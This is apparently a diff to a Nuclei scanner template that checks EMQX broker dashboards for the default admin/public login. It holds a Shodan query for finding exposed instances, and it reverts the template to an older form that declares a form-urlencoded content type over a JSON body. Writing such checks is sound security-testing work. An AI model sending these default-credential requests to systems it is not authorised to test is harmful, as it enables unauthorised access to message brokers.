@@ -10,30 +10,25 @@ info:
     cvss-score: 8.3
     cwe-id: CWE-522
   metadata:
-    max-request: 1
     shodan-query: http.favicon.hash:"-670975485"
   tags: emqx,default-login
 
-variables:
-  username: "admin"
-  password: "public"
-
-http:
+requests:
   - raw:
       - |
-        POST {{path}} HTTP/1.1
+        POST /api/v4/auth HTTP/1.1
         Host: {{Hostname}}
-        Content-Type: application/json
+        Content-Type: application/x-www-form-urlencoded
 
-        {"username":"{{username}}","password":"{{password}}"}
+        {"username":"{{user}}","password":"{{pass}}"}
 
-    attack: clusterbomb
+    attack: pitchfork
     payloads:
-      path:
-        - "/api/v4/auth"
-        - "/api/v5/login"
+      user:
+        - admin
+      pass:
+        - public
 
-    matchers-condition: or
     matchers:
       - type: dsl
         dsl:
@@ -41,10 +36,4 @@ http:
           - status_code == 200
         condition: and
 
-      - type: dsl
-        dsl:
-          - contains(body, "\"token\":") && contains(body, "\"license\":")
-          - contains(content_type, 'application/json')
-          - status_code == 200
-        condition: and
-# digest: 490a0046304402200ff33809984d5fd3bef9ed1c67d285f303e8e0ca1f3dfefe932dfc848bf9389b02205ede1342037983eec078e752241c177cc71024dfb71070267f346f5f6cf80765:922c64590222798bb761d5b6d8e72950
+# Enhanced by mp on 2022/03/28
